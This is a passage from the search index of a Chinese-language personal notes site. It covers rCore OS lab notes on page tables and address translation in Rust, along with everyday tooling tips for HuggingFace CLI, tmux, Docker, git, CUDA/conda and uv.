\u662f\u6240\u8c13\u7684\u6052\u7b49\u6620\u5c04\uff0c\u6211\u4eec\u5728\u5185\u6838\u4e2d\u8fd8\u662f\u9700\u8981\u5bf9\u7269\u7406\u5730\u5740\u8fdb\u884c\u76f4\u63a5\u5730\u64cd\u4f5c\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u6784\u5efa\u4e00\u79cd\u7279\u6b8a\u7684\u6620\u5c04\uff0c\u5176VPN\u5c31\u7b49\u4e8ePPN\uff0c\u901a\u8fc7\u8fd9\u7c7b\u9875\u8868\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u5730\u5740</li> <li>Framed \u5c31\u662f\u6b63\u5e38\u7684\u591a\u7ea7\u9875\u8868</li> </ul> <p>\u4f8b\u5982\u6211\u4eec\u6765\u770b\u770bMapArea\u5176\u4e2d\u4e00\u4e2a\u65b9\u6cd5</p> <pre><code>    pub fn map_one(&amp;mut self, page_table: &amp;mut PageTable, vpn: VirtPageNum) {\n        let ppn: PhysPageNum;\n        match self.map_type {\n            MapType::Identical =&gt; {\n                ppn = PhysPageNum(vpn.0);\n            }\n            MapType::Framed =&gt; {\n                let frame = frame_alloc().unwrap();\n                ppn = frame.ppn;\n                self.data_frames.insert(vpn, frame);\n            }\n        }\n        let pte_flags = PTEFlags::from_bits(self.map_perm.bits).unwrap();\n        page_table.map(vpn, ppn, pte_flags);\n    }\n</code></pre> <p>\u6211\u4eec\u627e\u5230PPN\u4e4b\u540e\uff0c\u5728data_frames\u4e2d\u63d2\u5165vpn-ppn\u6620\u5c04\uff0c\u540c\u65f6\u5728page_table\u4e2d\u4e5f\u5b8c\u6210\u76f8\u5e94\u7684\u63d2\u5165</p> <p>\u5728\u6b64\u4e4b\u4e0a\u6211\u4eec\u6784\u5efa\u51fa\u6574\u4e2a\u5730\u5740\u7a7a\u95f4\u7684\u6570\u636e\u7ed3\u6784</p> <pre><code>pub struct MemorySet {\n    page_table: PageTable,\n    areas: Vec&lt;MapArea&gt;,\n}\n</code></pre> <p>\u4e4b\u540e\u6211\u4eec\u6784\u5efa\u5185\u6838\u7684\u5e94\u7528\u7684\u5730\u5740\u7a7a\u95f4</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#45","title":"4.5 \u57fa\u4e8e\u5730\u5740\u7a7a\u95f4\u7684\u5206\u65f6\u591a\u4efb\u52a1","text":"<p>\u8ba9\u6211\u4eec\u56de\u5230main.rs\u4e2d\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u542f\u52a8\u4e0d\u4e45\uff0c\u6211\u4eec\u5c31\u8c03\u7528\u4e86\u521d\u59cb\u5316\u5730\u5740\u7a7a\u95f4\u8fd9\u4e2a\u51fd\u6570</p> <pre><code>// main.rs\nmm::init();\n\n// os/src/mm/mod.rs\n\npub use memory_set::KERNEL_SPACE;\n\npub fn init() {\n    heap_allocator::init_heap();\n    frame_allocator::init_frame_allocator();\n    KERNEL_SPACE.exclusive_access().activate();\n}\n</code></pre> <p>\u8fd9\u4e2aKERNE_SPACE\uff0c\u662f\u4e00\u4e2a\u5168\u5c40\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u5bf9\u8c61\uff0c\u5728\u4e0a\u8ff0\u4ee3\u7801\u7684\u7b2c11\u884c\uff0c\u4f9d\u7167lazy_static!\u5b8f\u7684\u5b9a\u4e49\uff0c\u8be5\u5168\u5c40\u5bf9\u8c61\u7b2c\u4e00\u6b21\u88ab\u4f7f\u7528\u5230\u7684\u65f6\u5019\u88ab\u521d\u59cb\u5316\u3002</p> <p>\u5728\u521d\u59cb\u5316\u4e4b\u540e\u6211\u4eec\u8c03\u7528activate\u51fd\u6570\uff0c\u5207\u6362\u6210SV39\uff0c\u7136\u540e\u5c06\u6839\u9875\u653e\u5230satp\uff0c\u542f\u52a8MMU\u3002\u540e\u9762\u7684\u8fd9\u884c\u6c47\u7f16\u662f\u7528\u4e8e\u6e05\u7a7a\u5730\u5740\u7f13\u5b58\uff0c\u4e5f\u5c31\u662f\u5feb\u8868</p> <pre><code>impl MemorySet {\n    pub fn activate(&amp;self) {\n        let satp = self.page_table.token(); \n        unsafe {\n            satp::write(satp);\n            asm!(\"sfence.vma\" :::: \"volatile\");\n        }\n    }\n}\n</code></pre> <p>\u5728\u6211\u4eec\u5f53\u524d\u7684\u8bbe\u8ba1\u4e2d\uff0c\u5e94\u7528\u7684\u5730\u5740\u7a7a\u95f4\u548c\u5185\u6838\u7684\u5730\u5740\u7a7a\u95f4\u662f\u5206\u5f00\u6765\u7ef4\u62a4\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u5728Trap\u7684\u540c\u65f6\u5207\u6362\u5730\u5740\u7a7a\u95f4</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#_1","title":"\u5b9e\u9a8c","text":"<p>\u7531\u7cfb\u7edf\u8c03\u7528\u4f20\u5165\u7cfb\u7edf\u6808\u7684\u5730\u5740\uff0c\u662f\u5e94\u7528\u7a0b\u5e8f\u7684\u865a\u62df\u5730\u5740\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u8f6c\u6362\u6210\u7269\u7406\u5730\u5740\u4e4b\u540e\u518d\u7cfb\u7edf\u6808\u4e2d\u8fdb\u884c\u8bbf\u95ee</p> <pre><code>/// write buf of length `len`  to a file with `fd`\npub fn sys_write(fd: usize, buf: *const u8, len: usize) -&gt; isize {\n    match fd {\n        FD_STDOUT =&gt; {\n            let buffers = translated_byte_buffer(current_user_token(), buf, len);\n            for buffer in buffers {\n                print!(\"{}\", core::str::from_utf8(buffer).unwrap());\n            }\n            len as isize\n        }\n        _ =&gt; {\n            panic!(\"Unsupported fd in sys_write!\");\n        }\n    }\n}\n</code></pre> <p>\u4f8b\u5982\u8fd9\u4e00\u6bb5\u4ee3\u7801\u4e2d\uff0cbuf\u8fd9\u4e2a\u6307\u9488\u662f\u4ece\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f20\u5165\u7684\uff0c\u56e0\u6b64\u8981\u5148\u7ecf\u5386\u5730\u5740\u7684translate\uff0c\u624d\u80fd\u5728\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u6b63\u5e38\u4f7f\u7528\uff0ctranslate\u7684\u4e09\u4e2a\u53c2\u6570</p> <ul> <li>\u7b2c\u4e00\u4e2a\uff0c\u9009\u62e9\u5f53\u524d\u7684\u7528\u6237\u5730\u5740\u7a7a\u95f4\uff0c\u4e5f\u5373\u9009\u62e9\u4e86\u7279\u5b9a\u7684\u80fd\u591f\u6b63\u786e\u7ffb\u8bd1\u7684\u9875\u8868</li> <li>\u7b2c\u4e8c\u4e2a\u5c31\u662f\u9700\u8981\u7ffb\u8bd1\u7684\u6307\u9488</li> <li>len\uff0c\u662f\u6307\u8fd9\u4e2a\u5730\u5740\u6240\u8868\u793a\u7684\u53d8\u91cf\u7684\u957f\u5ea6</li> </ul>"},{"location":"%E5%AE%9E%E9%AA%8C/DeepSeek%20Ocr%E7%9A%84%E5%8E%8B%E7%BC%A9%E4%BB%BB%E5%8A%A1/","title":"DeepSeek Ocr\u7684\u538b\u7f29\u4efb\u52a1","text":"<ul> <li>\u6211\u4eec\u662f\u5426\u6709\u5fc5\u8981\u628adeepseek ocr\u91cd\u8bad\u4e00\u904d\uff0c\u589e\u52a0\u4e00\u4e2avae adapter\uff0c\u8ba9\u4ed6\u7684\u8bed\u4e49\u66f4\u52a0\u89c4\u6574</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/Huggingface/","title":"Huggingface","text":"<p>Huggingface\u7c7b\u4f3c\u4e8eGithub\uff0c\u662f\u4e00\u4e2a\u4e91\u6258\u7ba1\u7684\u670d\u52a1\uff0c\u4f46\u662f\u5176\u4e2d\u5927\u591a\u662f\u6a21\u578b\u6743\u91cd\u548c\u6570\u636e\u96c6\uff0c\u76f8\u6bd4\u4e8eGithub\u91cc\u7684\u4ee3\u7801\u4ed3\u5e93\uff0c\u5b83\u4eec\u5f80\u5f80\u66f4\u52a0\u5927\u578b\uff0c\u4e5f\u6709\u5404\u79cd\u4f18\u5316\u7f51\u7edc\u4f20\u8f93\u548c\u52a0\u8f7d\u7684\u65b9\u6848</p> <pre><code>huggingface-cli download gdhe17/Self-Forcing checkpoints/self_forcing_dmd.pt --local-dir /mnt/nas_nfs/home/yuke/model/self_forcing/ --local-dir-use-symlinks False\n\nhuggingface-cli download lmms-lab/LLaVA-Video-7B-Qwen2 --local-dir /mnt/nas_nfs/home/yuke/model/LLaVA-Video-7B-Qwen2\n</code></pre> <p>huggingface-cli \u662f\u8001\u7248\u672c\u7684cli\u4e86\uff0c\u73b0\u5728\u7528hf\u6765\u66ff\u4ee3\u8fd9\u4e2acli</p> <pre><code>hf auth login\n\nexport HF_ENDPOINT=https://hf-mirror.com\n\nhf download ...\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/Mac%20%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/","title":"Mac \u5b9e\u7528\u5c0f\u6280\u5de7","text":"<ul> <li>Command + Shift + t \u7ec8\u7aef\u62c6\u5206</li> <li>Command + F3 \u56de\u5230\u684c\u9762</li> </ul> <p>\u8c03\u6574\u622a\u56fe</p> <ul> <li>Commnad Shift 4 \u662f\u82f9\u679c\u7684\u5c40\u90e8\u622a\u56fe\u6309\u94ae\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9Command Shift 5\u51fa\u73b0\u7684\u9009\u9879\u6309\u94ae\uff0c\u5c06\u622a\u56fe\u7684\u5185\u5bb9\u81ea\u52a8\u4fdd\u5b58\u5230\u7c98\u8d34\u677f</li> </ul> <p></p> <p>\u5173\u95ed\u8fd9\u4e2a\u4f7f\u7528\u5927\u5199\u9501\u5b9a\u952e\u5207\u6362ABC\u8f93\u5165\u6cd5\uff0c\u53ef\u4ee5\u6709\u6548\u52a0\u5feb\u4e2d\u82f1\u6587\u5207\u6362\u7684\u901f\u5ea6</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/Tmux/","title":"Tmux","text":"<p>tmux\u662f\u4e00\u4e2a\u7ec8\u7aef\u590d\u7528\u5668\uff0c\u53ef\u4ee5\u8ba9user\u66f4\u52a0\u968f\u5fc3\u6240\u6b32\u5730\u64cd\u4f5c\u7ec8\u7aef\uff0c\u4ee5\u53ca\u6258\u7ba1\u4efb\u52a1\uff0c\u5e76\u4e14\u5176\u4fdd\u8bc1\u4e86\u5373\u4fbf\u6211\u4eec\u7684\u8fde\u63a5\u65ad\u5f00\uff0c\u4efb\u52a1\u4e5f\u4e0d\u4f1a\u4e2d\u65ad\uff0c\u9002\u5408\u670d\u52a1\u5668\u5f62\u5f0f\u5f00\u53d1</p> <p>\u5e38\u89c1\u547d\u4ee4</p> <p>Tmux\u7684\u524d\u7f00\u952e\u662fCtrl+b</p> <ul> <li>tmux ls \u5217\u51fa\u6240\u6709\u7684tmux\u5bf9\u8bdd</li> <li>tmux new -s  \u65b0\u5efa\u4e00\u4e2a\u4f1a\u8bdd <li>tmux a -t  \u8fde\u63a5\u4e00\u4e2a\u5df2\u6709\u7684\u4f1a\u8bdd <li>\u5de6\u53f3\u62c6\u5206 Prefix + %</li> <li>\u5de6\u53f3\u79fb\u52a8 Prefix + -&gt; </li> <li>\u6eda\u52a8\u6a21\u5f0f Prefix + [ \u9000\u51fa q</li> <li>\u9000\u51fa\u4f1a\u8bdd Prefix + d</li>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/cuda%20toolkit/","title":"Cuda toolkit","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u8bb2\u8ff0torch, cuda, cuda toolkit\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u4ee5\u53ca\u5982\u4f55\u7528conda\u6765\u7ba1\u7406\u8fd9\u4e9b\u4e1c\u897f</p> <p>conda \u80fd\u591f\u7ba1\u7406\u7684\u662f\u7528\u6237\u7ea7\u522b\u7684cuda\u5305\uff0c\u4e0d\u5305\u62ec\u7cfb\u7edf\u7ea7\u522b\u7684\uff0c\u7cfb\u7edf\u7ea7\u522b\u7684cuda\u662fnvidia-smi\u5c55\u73b0\u51fa\u6765\u7684cuda\u7248\u672c\uff0cconda\u80fd\u591f\u7ba1\u7406\u7684\u5305\u62ec</p> <ul> <li>cuda-toolkit cuda\u7684\u7f16\u8bd1\u5de5\u5177</li> <li>cuDNN \u4e3a\u4ee3\u8868\u7684\u4e00\u7cfb\u5217cuda\u5e93</li> </ul> <p>\u5f53\u6211\u4eec\u5e73\u65f6\u4e0b\u8f7dtorch\u7684\u65f6\u5019\uff0c\u5176\u4f1a\u81ea\u52a8\u4e3a\u6211\u4eec\u4e0b\u8f7d\u4e0e\u5176\u76f8\u5339\u914d\u7684cuda\u4f9d\u8d56\u548c\u7f16\u8bd1\u5668\uff0ctorch\u548c\u6211\u4eec\u5f53\u524d\u7684conda\u73af\u5883\u91cc\u7684cuDNN\u7b49\u5e93\u76f8\u4e92\u5339\u914d</p> <p>conda\u548cpip\u548c\u4e92\u76f8\u4f7f\u7528\uff0c\u5728conda\u542f\u52a8\u73af\u5883\u4e4b\u540e\uff0c\u5efa\u8bae\u5148\u7528conda\u628a\u6838\u5fc3\u73af\u5883torch\u7b49\u76f8\u5173\u5185\u5bb9\u88c5\u597d\uff0c\u518d\u8003\u8651\u7528pip\u5b89\u88c5\u7eafpython\u7684\u5305</p> <p>\u6bd4\u5982\u6700\u5178\u578b\u7684flash-attn\u7684\u573a\u666f\uff0c\u8fd9\u4e2a\u5305\u5728\u9ed8\u8ba4\u5b89\u88c5\u6761\u4ef6\u4e0b\u7ecf\u5e38\u51fa\u95ee\u9898</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/cuda%20toolkit/#1-conda-cuda","title":"1. conda cuda","text":"<ul> <li><code>conda install cudatoolkit == &lt;version&gt; -c nvidia</code></li> <li><code>conda install pytorch ...</code></li> <li><code>conda install cuda-nvcc</code></li> </ul> <p>\u4ee5\u524d\u7684\u7ba1\u7406\u65b9\u6848\u57fa\u672c\u5982\u4e0a\uff0c\u73b0\u5728\u7528conda\u7ba1\u7406\u4e0d\u518d\u4e3b\u6d41\uff0c\u5e76\u4e14pytorch\u672c\u8eab\u4e5f\u4e0d\u518d\u63d0\u4f9b\u7ed9conda\u7684\u5305\uff0c\u73b0\u5728\u7684\u7248\u672c\u5c31\u662f\u7528uv\u6765\u7ba1\u7406torch\u7684\u73af\u5883</p> <p>\u73b0\u5728\u7684torch\u5305\u4e2d\u5f80\u5f80\u81ea\u5e26CUDA\u8fd0\u884c\u65f6\u76f8\u5173\u5e93\uff0c\u56e0\u6b64\u73b0\u5728\u5b89\u88c5torch\u5bb9\u6613\u4e86\u8bb8\u591a\uff0c\u4f46\u662f\u4e0e\u6b64\u540c\u65f6\uff0c\u5b89\u88c5\u5176\u4ed6\u9700\u8981nvcc\u7b49\u7f16\u8bd1\u5de5\u5177\u7684python\u5305\u7684\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u6bd4\u5982flash attention</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/docker/docker/","title":"Docker","text":"<p>docker\u662f\u73b0\u4ee3\u6700\u6d41\u884c\u7684\u5bb9\u5668\u6280\u672f\uff0c\u662f\u8fd0\u7ef4\u6280\u672f\u548c\u5206\u5e03\u5f0f\u6280\u672f\u7684\u57fa\u7840\u4e4b\u4e00</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/docker/docker/#1","title":"1. \u57fa\u7840\u6982\u5ff5","text":"<p>docker\u4e2d\u6709\u4e24\u79cd\u57fa\u672c\u6982\u5ff5 \u955c\u50cf image \u548c\u5bb9\u5668 container</p> <p>\u5bb9\u5668\u662f\u955c\u50cf\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u4f8b\u5982\u4f60\u6709\u4e00\u4e2aMySQL 8.0\u7684\u955c\u50cf\uff0c\u4f60\u540c\u65f6\u8fd0\u884c\u4e864\u4e2a\uff0c\u5c31\u6709\u4e864\u4e2aMySQL\u5bb9\u5668</p> <ul> <li>docker images \u67e5\u770b\u4f60\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u955c\u50cf</li> <li>docker ps \u67e5\u770b\u4f60\u7cfb\u7edf\u4e0a\u7684\u8fd0\u884c\u4e2d\u5bb9\u5668</li> <li>docker ps -a \u67e5\u770b\u4f60\u7cfb\u7edf\u4e0a\u6240\u6709\u7684\u5bb9\u5668 </li> </ul> <p>Image\u53ef\u4ee5\u4ece\u4ed3\u5e93Hub\u83b7\u53d6\uff0c\u4f8b\u5982\u6700\u7ecf\u5178\u7684Docker Hub\u4e0a\u6709\u5f88\u591a\u7684Image\u53ef\u4ee5\u4f9b\u6211\u4eec\u4f7f\u7528\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u7f16\u5199\u7684Dockerfile\uff0c\u628a\u6211\u4eec\u672c\u5730\u7684\u7a0b\u5e8f\u6253\u5305\u6210\u4e00\u4e2aDocker</p> <ul> <li>Docker pull  <li>Docker push  <p>\u9664\u4e86image\u548ccontainer\uff0cdocker\u4e2d\u8fd8\u6709\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5c31\u662f\u5377 volume\uff0ccontainer\u672c\u8eab\u662f\u65e0\u72b6\u6001\u7684\uff0c\u5f53\u5bb9\u5668\u88ab\u5220\u9664\u4e4b\u540e\uff0c\u5176\u4e2d\u6570\u636e\u4f1a\u5168\u90e8\u4e22\u5931\uff0c\u5982\u679c\u7528\u6237\u5e0c\u671b\u6570\u636e\u72ec\u7acb\u4e0e\u5355\u4e2acontainer\u6301\u4e45\u5316\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u7528\u5230volume</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/docker/docker/#2","title":"2. \u57fa\u7840\u547d\u4ee4","text":"<p>\u5173\u4e8e\u955c\u50cf</p> <ul> <li>Docker pull  <li>Docker images</li> <li>Docker rmi  \u5220\u9664\u955c\u50cf <li>Docker build -t  <ul> <li>\u4f8b\u5982 <code>docker build -t my-custom-app:1.0 .</code></li> </ul> <li>Docker push  <li>docker image prune -f \u8be5\u547d\u4ee4\u53ef\u4ee5\u6e05\u7406\u4e3aNone\u7684\u955c\u50cf<ul> <li>\u4ec0\u4e48\u65f6\u5019\u955c\u50cf\u4f1a\u53d8\u6210None tag</li> <li>\u955c\u50cf\u7684tag\u662f\u4ec0\u4e48\u610f\u601d</li> </ul> </li> <p>\u5173\u4e8e\u5bb9\u5668</p> <ul> <li>Docker run  \u57fa\u4e8e\u67d0\u4e2a\u955c\u50cf\u542f\u52a8\u5bb9\u5668\uff0c\u8fd9\u4e2a\u547d\u4ee4\u5e38\u5e38\u4f1a\u5e26\u6709\u5927\u91cf\u53c2\u6570<ul> <li>-name  \u81ea\u5b9a\u4e49\u5bb9\u5668\u540d <li>d \u540e\u53f0\u8fd0\u884c\u4e0d\u6253\u5370\u65e5\u5fd7</li> <li>v \u5b9a\u4e49\u5377\u8def\u5f84</li> <li>e \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</li> <li>it \u4ea4\u4e92\u5f0f\u8fd0\u884c</li> <li>Docker ps</li> <li>Docker start  \u542f\u52a8\u5df2\u7ecf\u505c\u6b62\u7684\u5bb9\u5668 <li>Docker stop  \u505c\u6b62\u5df2\u7ecf\u542f\u52a8\u7684\u5bb9\u5668 <li>Docker rm  \u5220\u9664\u5b58\u5728\u7684\u5bb9\u5668 <li>Docker logs  <li>Docker exec -it &lt;\u5bb9\u5668ID\u6216\u5bb9\u5668\u540d&gt; &lt;\u547d\u4ee4&gt;<ul> <li>docker exec -it mysql-test bash \u5e38\u7528\u7684\u542f\u52a8bash\u547d\u4ee4</li> </ul> </li> <p>\u5173\u4e8e\u5377</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/docker/docker/#3","title":"3. \u7f51\u7edc","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/git%20and%20github.md/git%20and%20github/","title":"git and github","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/git%20and%20github.md/git%20and%20github/#basic-information-of-git","title":"basic information of git","text":"<p>git is a distributed version control system as opposed to centralized version control system git makes every developers' computer contains the whole history (git\u4fdd\u5b58\u7684\u4ee3\u7801\u7248\u672c\uff0c\u5b58\u653e\u5728\u672c\u7535\u8111\u4e2d\uff0c\u800c\u4e0d\u662f\u8fdc\u7a0b\u670d\u52a1\u5668 and centralized version control system makes the history stores in a remote server</p> <p>we will call the entire history of the whole project \"repository\"</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/git%20and%20github.md/git%20and%20github/#basic-git-command","title":"basic git command","text":"<pre><code>git init\ngit add\ngit commit\ngit log\ngit status\ngit show\ngit checkout\n</code></pre> <p>if you want to use checkout command, you would better choose one folder or file.</p> <p>when we initialize a git repository, we will create a '.git' subdirectory in it. this subdirectory will contain a brunch of metadata, and we will never directly open it.</p> <p>\u200b\u200b</p> <p>we can use command \"git status\" to check the status of each file</p> <p>git add \u7528\u6765\u628a\u6307\u5b9a\u6587\u4ef6\u6dfb\u52a0\u5230\u4e0b\u4e00\u6b21\u8981\u63d0\u4ea4\u7684\u5185\u5bb9\u4e2d git commit \u628a\u8981\u63d0\u4ea4\u7684\u4e1c\u897f\u4fdd\u5b58\u4e0b\u6765\uff0c\u5e76\u4e14\u6dfb\u52a0\u8bf4\u660e</p> <pre><code>git add FILENAME\ngit commit -m \"\u8bf4\u660e\"\n</code></pre> <p>git log is a good way to view commit history</p> <p>undoing changes \u64a4\u9500\u66f4\u6539</p> <p>We can use the command <code>git reset FILENAME</code>\u200b to take the file status back to the modified.</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/git%20and%20github.md/git%20and%20github/#remote-repository","title":"remote repository","text":"<p>how to connect with your own repository</p> <ol> <li>\u6211\u4eec\u9700\u8981\u628a\u672c\u5730\u7684git\u4ed3\u5e93\u548c\u6211\u4eec\u5efa\u7acb\u7684GitHub\u4ed3\u5e93\u8fdc\u7a0b\u94fe\u63a5</li> <li>\u6211\u4eecGitHub\u8d26\u53f7\u9700\u8981\u94fe\u63a5\u4e0a\u672c\u5730git\u8d26\u53f7\u7684rsa\u5bc6\u94a5</li> <li>\u672c\u5730git \u8fdb\u884c\u5404\u79cd\u5904\u7406\u4e4b\u540e\uff0c\u53ef\u4ee5push\u7ed9GitHub\u4e86  git push origin master \u8fd9\u662f\u76f4\u63a5\u4f20\u9012\u7ed9\u4e3b\u679d\u5e72\u7684\u547d\u4ee4</li> </ol>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/git%20and%20github.md/git%20and%20github/#git-branch","title":"git branch","text":"<p>Former action we mentioned is all in the master branch. Although we can iterated many version of the master branch, it still have limited function.</p> <p>And branching allows our program having multiple dimensions. Each time you want to make a dramatic change to your code or you just don't want to mix you work up or you may have several opinion and you don't which one will works, you can choose to make a branch.</p> <p>basic command of git branching</p> <pre><code>git branch BRANCH_NAME //create a new branch\ngit checkout BRANCH_NAME //switch from one branch to another\n\ngit checkout -b BRANCH_NAME //create a new branch and turn into it\ngit branch -d BRANCH_NAME   //delete one branch\n</code></pre> <p>Note:  it is advised that you should use the default \"master\" branch as your main branch.</p> <p>branch merging</p> <pre><code>git checkout master\ngit merge BRANCH_NAME\n</code></pre> <p>These two commands will delete the branch and merge it into master.</p> <p>\u5c06\u81ea\u5df1\u672c\u5730\u7684\u5206\u652f\u63a8\u9001\u5230\u8fdc\u7a0b\u7684</p> <pre><code>git push origin main:master\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/profiler/GPU%20Profiler/","title":"GPU Profiler","text":"<p>Nsys &amp; Ncu</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/profiler/profiling%20tools/","title":"Profiling tools","text":"<p>\u4e00\u4e9b\u6027\u80fd\u5206\u6790\u7684\u5de5\u5177\uff0c\u6bd4\u5982pprof\u548cperf</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/python/Python%20Package%20Management/","title":"Python Package Management","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/python/Python%20Package%20Management/#1-conda","title":"1. Conda","text":"<p>conda \u662f\u4e00\u4e2a\u975e\u5e38\u5e38\u7528\u7684Python\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u5e38\u7528\u4e8e\u79d1\u5b66\u8ba1\u7b97\u573a\u666f\uff0c\u56e0\u6b64\u5176\u4e0d\u6b62\u505a\u4e86Python\u7684\u5305\u7ba1\u7406\uff0c\u540c\u65f6\u8fd8\u5904\u7406cuda\u7b49\u73af\u5883\u7684\u7ba1\u7406\u3002</p> <p>\u5e38\u7528\u547d\u4ee4\u5305\u542b</p> <ul> <li><code>conda create -n &lt;env_name&gt; python=3.10</code></li> <li><code>conda activate &lt;env_name&gt;</code> &amp; <code>conda deactivate &lt;env_name&gt;</code></li> <li><code>conda remove -n &lt;env_name&gt; --all</code></li> </ul> <pre><code>/mnt/nas_nfs/home/yuke/model/Wan2.1-T2V-1.3B-Diffusers\n\n\nsglang generate --model-path /mnt/nas_nfs/home/yuke/model/Wan2.1-T2V-1.3B-Diffusers \\\n    --prompt \"A curious raccoon\" \\\n    --save-output\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/python/Python%20Package%20Management/#2-uv","title":"2. uv","text":"<p>uv \u662f\u4e00\u4e2a\u975e\u5e38\u65b0\u7684python\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u5de5\u5177\u94fe\u5f88\u73b0\u4ee3\u5316\uff0c\u5e76\u4e14\u901f\u5ea6\u5feb\u7684\u60ca\u4eba\uff0c\u76f8\u5bf9\u4e8econda\u800c\u8a00</p> <p>\u5e38\u7528\u547d\u4ee4\u5305\u62ec</p> <ul> <li><code>uv init</code></li> <li><code>uv venv</code></li> <li><code>uv add &lt;package_name&gt;</code></li> </ul> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u89c6\u9891\u94fe\u63a5 \u6765\u4ecb\u7ecduv</p> <p>\u5f53\u6211\u4eec\u4f7f\u7528uv\u7684venv\u4e4b\u540e\uff0c\u5728\u6fc0\u6d3b\u865a\u62df\u73af\u5883\u4e4b\u540e\u6709\u4e00\u7cfb\u5217\u7684\u9009\u62e9</p> <ul> <li>pip install \u7528pip\u539f\u751f\u7684\u89e3\u6790\u5668</li> <li>uv pip install \u7528uv\u7684\u89e3\u6790\u5668\uff0c\u901f\u5ea6\u66f4\u5feb</li> <li>uv add \u4f7f\u7528uv\u89e3\u6790\u5668\u6750\u7684\u540c\u65f6\uff0c\u8fd8\u53ef\u4ee5\u7ef4\u62a4uv\u7684pyproject.toml</li> </ul> <p>uv \u5e38\u7528\u7684\u955c\u50cf\u6e90</p> <pre><code>export UV_DEFAULT_INDEX=\"https://pypi.tuna.tsinghua.edu.cn/simple\"\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/python/Static%20Analysis%20Tools/","title":"Static Analysis 